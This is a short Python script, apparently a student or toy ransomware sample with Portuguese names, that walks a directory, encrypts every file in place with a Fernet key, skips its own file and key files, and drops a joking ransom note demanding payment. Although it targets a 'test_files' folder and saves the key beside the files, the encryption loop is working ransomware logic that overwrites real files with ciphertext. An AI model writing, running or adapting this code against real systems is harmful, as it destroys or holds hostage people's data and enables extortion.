from cryptography.fernet import Fernet
import os

def criptogravar_arquivo(arquivo,chave):
    
    f = Fernet(chave)

    with open(arquivo, "rb") as file:
        dados = file.read()
        file.close()

    encripty = f.encrypt(dados)

    with open(arquivo, "wb") as file:
        file.write(encripty)
        file.close()

def mensagem_resgate():
    with open("LeiaMe.txt" , "w", encoding='utf-8') as file:
        file.write("Caiu na pagadinha do malandro.\n")
        file.write("E agora vai ter que pagar o ingresso ou vai ficar sem os arquivos\n")
        file.write("Me envie Duas Gálaxias e uma rosa ou vai tem que dormir em posição fecal por um bom tempo\n")
        file.close()

def main(diretorio):

    chave = Fernet.generate_key()
    with open("chave.key", "wb") as file:
        file.write(chave)
        file.close()

    for raiz,_,arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz,nome)
            if nome != "ransow.py" and not nome.endswith(".key"):
                criptogravar_arquivo(caminho,chave)

    mensagem_resgate()

main("test_files")